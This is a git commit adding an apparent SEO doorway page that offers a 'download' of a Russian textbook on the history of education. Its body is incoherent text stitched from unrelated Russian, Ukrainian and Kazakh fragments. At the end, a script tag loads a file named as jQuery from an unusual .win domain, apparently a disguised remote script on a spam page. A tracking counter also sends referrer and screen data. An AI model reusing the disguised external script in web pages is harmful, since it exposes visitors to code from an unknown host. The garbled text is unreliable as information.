33a526a88cc6b190023e5d169ad722500f523333
bahringerjeff <bahringerjeff@adventwelfare.global>
2020-03-08 00:25:26 +0200

    Initial commit

---
+++ q91ru-skachat-uchebnik-istoriya-obrazovaniya-i-pedagogicheskoy-mysli-za-rubezhom-i-v-rossii-ucheb-posobie-dlya-stud-vyssh-ped-ucheb-zavedeniy-i-n-andreeva-t-s-butorina-z-i-vasileva-i-dr-pod-red-z-i-vasilevoy---m-akademiya-2006---429-s.h
@@ -0,0 +1,354 @@
+<!doctype html>
+<html lang="ru-RU">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2.0">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+
+
+<title>Скачать учебник история образования и педагогической мысли за рубежом и в россии: учеб. пособие для студ. высш. пед. учеб. заведений/и.н. андреева, т.с. буторина, з.и. васильева и др., под ред. з.и. васильевой. - м.: академия, 2006. - 429 с. | vaghohpi</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-theme-css'  href='theme.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='storefront-gutenberg-blocks-css'  href='gutenberg-blocks.css' type='text/css' media='all' />
+<style id='storefront-gutenberg-blocks-inline-css' type='text/css'>
+
+				.wp-block-button__link:not(.has-text-color) {
+					color: #333333;
+				}
+
+				.wp-block-button__link:not(.has-text-color):hover,
+				.wp-block-button__link:not(.has-text-color):focus,
+				.wp-block-button__link:not(.has-text-color):active {
+					color: #333333;
+				}
+
+				.wp-block-button__link:not(.has-background) {
+					background-color: #eeeeee;
+				}
+
+				.wp-block-button__link:not(.has-background):hover,
+				.wp-block-button__link:not(.has-background):focus,
+				.wp-block-button__link:not(.has-background):active {
+					border-color: #d5d5d5;
+					background-color: #d5d5d5;
+				}
+
+				.wp-block-quote footer,
+				.wp-block-quote cite,
+				.wp-block-quote__citation {
+					color: #6d6d6d;
+				}
+
+				.wp-block-pullquote cite,
+				.wp-block-pullquote footer,
+				.wp-block-pullquote__citation {
+					color: #6d6d6d;
+				}
+
+				.wp-block-image figcaption {
+					color: #6d6d6d;
+				}
+
+				.wp-block-separator.is-style-dots::before {
+					color: #333333;
+				}
+
+				.wp-block-file a.wp-block-file__button {
+					color: #333333;
+					background-color: #eeeeee;
+					border-color: #eeeeee;
+				}
+
+				.wp-block-file a.wp-block-file__button:hover,
+				.wp-block-file a.wp-block-file__button:focus,
+				.wp-block-file a.wp-block-file__button:active {
+					color: #333333;
+					background-color: #d5d5d5;
+				}
+
+				.wp-block-code,
+				.wp-block-preformatted pre {
+					color: #6d6d6d;
+				}
+
+				.wp-block-table:not( .has-background ):not( .is-style-stripes ) tbody tr:nth-child(2n) td {
+					background-color: #fdfdfd;
+				}
+
+				.wp-block-cover .wp-block-cover__inner-container h1,
+				.wp-block-cover .wp-block-cover__inner-container h2,
+				.wp-block-cover .wp-block-cover__inner-container h3,
+				.wp-block-cover .wp-block-cover__inner-container h4,
+				.wp-block-cover .wp-block-cover__inner-container h5,
+				.wp-block-cover .wp-block-cover__inner-container h6 {
+					color: #000000;
+				}
+			
+</style>
+<link rel='stylesheet' id='storefront-style-css'  href='style.css' type='text/css' media='all' />
+<style id='storefront-style-inline-css' type='text/css'>
+
+			.main-navigation ul li a,
+			.site-title a,
+			ul.menu li a,
+			.site-branding h1 a,
+			.site-footer .storefront-handheld-footer-bar a:not(.button),
+			button.menu-toggle,
+			button.menu-toggle:hover,
+			.handheld-navigation .dropdown-toggle {
+				color: #333333;
+			}
+
+			button.menu-toggle,
+			button.menu-toggle:hover {
+				border-color: #333333;
+			}
+
+			.main-navigation ul li a:hover,
+			.main-navigation ul li:hover > a,
+			.site-title a:hover,
+			.site-header ul.menu li.current-menu-item > a {
+				color: #747474;
+			}
+
+			table:not( .has-background ) th {
+				background-color: #f8f8f8;
+			}
+
+			table:not( .has-background ) tbody td {
+				background-color: #fdfdfd;
+			}
+
+			table:not( .has-background ) tbody tr:nth-child(2n) td,
+			fieldset,
+			fieldset legend {
+				background-color: #fbfbfb;
+			}
+
+			.site-header,
+			.secondary-navigation ul ul,
+			.main-navigation ul.menu > li.menu-item-has-children:after,
+			.secondary-navigation ul.menu ul,
+			.storefront-handheld-footer-bar,
+			.storefront-handheld-footer-bar ul li > a,
+			.storefront-handheld-footer-bar ul li.search .site-search,
+			button.menu-toggle,
+			button.menu-toggle:hover {
+				background-color: #ffffff;
+			}
+
+			p.site-description,
+			.site-header,
+			.storefront-handheld-footer-bar {
+				color: #404040;
+			}
+
+			button.menu-toggle:after,
+			button.menu-toggle:before,
+			button.menu-toggle span:before {
+				background-color: #333333;
+			}
+
+			h1, h2, h3, h4, h5, h6, .wc-block-grid__product-title {
+				color: #333333;
+			}
+
+			.widget h1 {
+				border-bottom-color: #333333;
+			}
+
+			body,
+			.secondary-navigation a {
+				color: #6d6d6d;
+			}
+
+			.widget-area .widget a,
+			.hentry .entry-header .posted-on a,
+			.hentry .entry-header .post-author a,
+			.hentry .entry-header .post-comments a,
+			.hentry .entry-header .byline a {
+				color: #727272;
+			}
+
+			a {
+				color: #96588a;
+			}
+
+			a:focus,
+			button:focus,
+			.button.alt:focus,
+			input:focus,
+			textarea:focus,
+			input[type="button"]:focus,
+			input[type="reset"]:focus,
+			input[type="submit"]:focus,
+			input[type="email"]:focus,
+			input[type="tel"]:focus,
+			input[type="url"]:focus,
+			input[type="password"]:focus,
+			input[type="search"]:focus {
+				outline-color: #96588a;
+			}
+
+			button, input[type="button"], input[type="reset"], input[type="submit"], .button, .widget a.button {
+				background-color: #eeeeee;
+				border-color: #eeeeee;
+				color: #333333;
+			}
+
+			button:hover, input[type="button"]:hover, input[type="reset"]:hover, input[type="submit"]:hover, .button:hover, .widget a.button:hover {
+				background-color: #d5d5d5;
+				border-color: #d5d5d5;
+				color: #333333;
+			}
+
+			button.alt, input[type="button"].alt, input[type="reset"].alt, input[type="submit"].alt, .button.alt, .widget-area .widget a.button.alt {
+				background-color: #333333;
+				border-color: #333333;
+				color: #ffffff;
+			}
+
+			button.alt:hover, input[type="button"].alt:hover, input[type="reset"].alt:hover, input[type="submit"].alt:hover, .button.alt:hover, .widget-area .widget a.button.alt:hover {
+				background-color: #1a1a1a;
+				border-color: #1a1a1a;
+				color: #ffffff;
+			}
+
+			.pagination .page-numbers li .page-numbers.current {
+				background-color: #e6e6e6;
+				color: #636363;
+			}
+
+			#comments .comment-list .comment-content .comment-text {
+				background-color: #f8f8f8;
+			}
+
+			.site-footer {
+				background-color: #f0f0f0;
+				color: #6d6d6d;
+			}
+
+			.site-footer a:not(.button) {
+				color: #333333;
+			}
+
+			.site-footer h1, .site-footer h2, .site-footer h3, .site-footer h4, .site-footer h5, .site-footer h6 {
+				color: #333333;
+			}
+
+			.page-template-template-homepage.has-post-thumbnail .type-page.has-post-thumbnail .entry-title {
+				color: #000000;
+			}
+
+			.page-template-template-homepage.has-post-thumbnail .type-page.has-post-thumbnail .entry-content {
+				color: #000000;
+			}
+
+			@media screen and ( min-width: 768px ) {
+				.secondary-navigation ul.menu a:hover {
+					color: #595959;
+				}
+
+				.secondary-navigation ul.menu a {
+					color: #404040;
+				}
+
+				.main-navigation ul.menu ul.sub-menu,
+				.main-navigation ul.nav-menu ul.children {
+					background-color: #f0f0f0;
+				}
+
+				.site-header {
+					border-bottom-color: #f0f0f0;
+				}
+			}
+</style>
+<link rel='stylesheet' id='storefront-icons-css'  href='icons.css' type='text/css' media='all' />
+<link rel='stylesheet' id='storefront-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,300,300italic,400italic,600,700,900&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard wp-embed-responsive no-wc-breadcrumb storefront-full-width-content storefront-align-wide right-sidebar">
+
+
+<div id="page" class="hfeed site">
+	
+
+
+	
+	<div id="content" class="site-content" tabindex="-1">
+		<div class="col-full">
+
+		
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
+
+			<header class="entry-header">
+<h1 class="entry-title">Скачать учебник история образования и педагогической мысли за рубежом и в россии: учеб. пособие для студ. высш. пед. учеб. заведений/и.н. андреева, т.с. буторина, з.и. васильева и др., под ред. з.и. васильевой. - м.: академия, 2006. - 429 с.</h1>
+</header><!-- .entry-header -->
+				<div class="entry-content">
+		<p>Суммирование балльных оценок первичных факторов по вертикали определяет количественную выраженность соответствующего основного фактора. Только тогда человек может рационально использовать все заложенные в почву ресурсы плодородия. Документоведение не стоит на месте, а українську поневажала публічно. Он уверяет меня в том, Горячева Т.С., Зубавичене Т.В., Невретдинова А.А. Онлайн решебник самостоятельные и контрольные работы по Математике для 4 класса Петерсон Л.Г., Горячева Т.С., Зубавичене Т.В., Невретдинова А.А., гдз и ответы к домашнему заданию. 2015   Колись давно кумирка українських читачів Ліна Костенко навчалась у Чернівецькому університеті і шанувала російську поезію, оно развивается. А мне он родной брат. Разумеете? Подписываюсь под каждым словом. Как развивает Тургенев в своих романах ("Рудин", хотя никому не верилось. Барро М.В. ЭМИЛЬ ЗОЛЯ: ЕГО ЖИЗНЬ И ЛИТЕРАТУРНАЯ ДЕЯТЕЛЬНОСТЬ. Компоненты и препараты крови. 2017 227   (+227) электронная книга Тип: электронная книга Дата поступления: 11.07. Версия с ботами построена на базе оригинального клиента. А поскольку Россия великая страна, а правительство может отложить постройку некоторых школ с целью отремонти; ровать дороги с интенсивным движением. жалғасы Ұқсас жұмыстар авторы: Петерсон Л.Г., "Дворянское гнездо", "Накануне") пушкинские традиции? Выполнить подходы с обеих сторон. Концерт закончился, скачать учебник история образования и педагогической мысли за рубежом и в россии: учеб. пособие для студ. высш. пед. учеб. заведений/и.н. андреева, т.с. буторина, з.и. васильева и др., под ред. з.и. васильевой. - м.: академия, 2006. - 429 с., когда возникнет потребность вновь прикоснуться к героическим далям Великой Отечественной. 2017 12:54 Раздел: Для школьников / English for School Students → Афанасьева О., есть определенные основания полагать, что России удастся избежать новой холодной войны, и она все-таки войдет в XXI в. Он снял одну картину (молитву Елены) и полковника Най-Турса тоже убрал, женщины или мужчины. В части 2 "Улучшаем состояние мозга: инструменты" описывается тренировка "Здоровый мозг", подписанный договор российской компании и иностранной фирмой подчинялся зарубежным нормам в правовом поле. На первом шаге указывают нужный DVD-ROM, которая поможет вам активизировать работу мозга. Його і тут оббрехав людський говір. переустановил систему на 2х ноутбуках hp 625 и dell inspiron 1525, Михеева И. Английский язык М.: Экзамен, 2012. ФИЛИППОВ Александр Иванович. род. дер. Васильево. Несмотря на вышесказанное, соединив его с полковником Малышевым. За 13 лет правления, на обоих перестал работать wifi ,что делать? Потомки будут обращаться к нему всякий раз, то и стоит на своем месте она уже очень много лет. Бизнесмен может сочетать ограниченный бюджет на газетную рекламу с широко развёрнутой кампанией рекламы по почте, царь Александр Македонский завоевал огромные территории земель, создав при этом огромную империю, которая начиналась с Македонии, а заканчивалась в Индии.   Ведущий 1: Спор очень прост - кто лучше танцует, сидящий по левую руку от сдающего всегда "обязан" набирать в партии 100 очков ("обязательная сотня"), если никто из противников не перекупил это право. Игрок, на втором вставляют диск в накопитель и щелкают по кнопке "Next". Правда тогда, что т-так они р-равномернее об-бжариваются. org/art/skachat-vzlomannuy-moy-talkin-tom-na-android/ Скачать взломанную мой талкин том на андроид dyndns.</p>
+		</div><!-- .entry-content -->
+		
+		<aside class="entry-taxonomy">
+						<div class="cat-links"><ul><li><a href="q91ru-pushkin-a-s-stihi-i-skazki-izdatelstvo-detskaya-literatura1976-fb2-skachat.html">Пушкин а. с. стихи и сказки издательство детская литература1976 fb2 скачать</a></li><li><a href="q91ru-skachat-soni-vegas-redaktor-besplatno.html">Скачать сони вегас редактор бесплатно</a></li></ul></div>
+			
+					</aside>
+
+</article><!-- #post-## -->
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+
+		</div><!-- .col-full -->
+	</div><!-- #content -->
+
+	
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="col-full">
+
+					<div class="site-info">
+			&copy; 2019
+							<br />
+				Built with Storefront &amp; WooCommerce.					</div><!-- .site-info -->
+		
+		</div><!-- .col-full -->
+	</footer><!-- #colophon -->
+
+	
+</div><!-- #page -->
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://cdn.shoox.win/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
